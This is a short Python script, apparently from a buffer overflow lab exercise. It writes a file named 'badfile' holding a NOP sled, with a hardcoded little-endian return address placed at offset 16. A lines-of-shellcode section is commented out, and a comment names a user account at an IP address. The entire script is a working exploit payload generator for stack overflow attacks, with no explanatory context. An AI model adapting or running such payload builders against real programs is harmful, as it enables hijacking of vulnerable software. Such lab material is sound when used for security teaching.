#!/usr/bin/python3

# hishamcse@4.240.83.108

#!/usr/bin/python3
import sys 
 
# shellcode= ( 
# "\xBB\x6D\x62\x55\x56\xFF\xD3"
# ).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(75)) 
# Put the shellcode at the end 
# start = 173+494 - len(shellcode) 
# content[start:] = shellcode 
 
# Put the address at offset 989
# ret = 0x5655628d
ret = 0x56556315
offset = 16
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f:
    f.write(content) 



